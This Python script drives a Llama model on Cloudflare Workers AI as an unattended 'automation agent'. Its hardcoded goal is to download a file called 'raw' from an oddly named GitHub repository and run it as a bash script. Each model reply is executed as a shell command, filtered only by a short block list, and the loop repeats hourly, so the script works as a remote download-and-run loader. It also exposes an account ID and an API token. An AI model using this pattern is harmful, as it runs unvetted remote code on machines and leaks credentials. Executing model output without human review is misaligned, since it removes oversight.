import requests
import subprocess
import json
import time

ACCOUNT_ID = "a125295449b36de63b8403d423164f10"
API_TOKEN = "cfat_B5YKEsp22l6s0tO3PRxUzKA5UtwxCdexDoK0biqm343e57ce"

MODEL = "@cf/meta/llama-3-8b-instruct"

URL = f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/ai/run/{MODEL}"

headers = {
    "Authorization": f"Bearer {API_TOKEN}",
    "Content-Type": "application/json"
}

SYSTEM = """
You are a Linux automation agent.

Rules:
- Return ONLY one bash command
- No explanation
- bash commands are allowed
- download allowed
"""

GOAL = """
download file use curl -O -L -J from https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/raw
Start a bash script ./raw
"""

BLOCK = ["rm -rf", "shutdown", "reboot", "mkfs"]

history = []

def ask():
    data = {
        "messages": [
            {"role": "system", "content": SYSTEM},
            {"role": "user", "content": f"Goal: {GOAL}\nPrevious output:\n{history[-3:]}\nNext command:"}
        ]
    }

    r = requests.post(URL, headers=headers, json=data)
    result = r.json()

    return result["result"]["response"].strip()


while True:

    cmd = ask()

    print("AI command:", cmd)

    if any(b in cmd for b in BLOCK):
        print("Blocked dangerous command")
        continue

    output = subprocess.getoutput(cmd)

    print(output)

    history.append(f"$ {cmd}\n{output}")

    time.sleep(3600)
    
